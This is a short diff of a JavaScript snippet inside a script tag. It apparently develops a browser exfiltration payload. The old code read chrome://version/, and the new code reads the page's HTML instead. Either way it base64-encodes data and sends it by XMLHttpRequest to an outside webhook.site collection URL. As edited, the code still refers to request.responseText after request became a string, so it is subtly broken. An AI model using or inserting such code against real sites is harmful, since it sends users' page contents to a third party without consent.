@@ -1,10 +1,13 @@
 <script>
-const request = new XMLHttpRequest();
-request.open("GET", "chrome://version/", false);
-request.send(null);
+//const request = new XMLHttpRequest();
+//request.open("GET", "chrome://version/", false);
+//request.send(null);
 
 //if (request.status === 200) {
 
+  const request = document.getElementsByTagName("HTML")[0].innerHTML;
+
+   
    const request2 = new XMLHttpRequest();
    request2.open("GET", "https://webhook.site/61d14abf-1552-4231-ac33-481aca823fff?r="+btoa(request.responseText), false);
    request2.send(null);
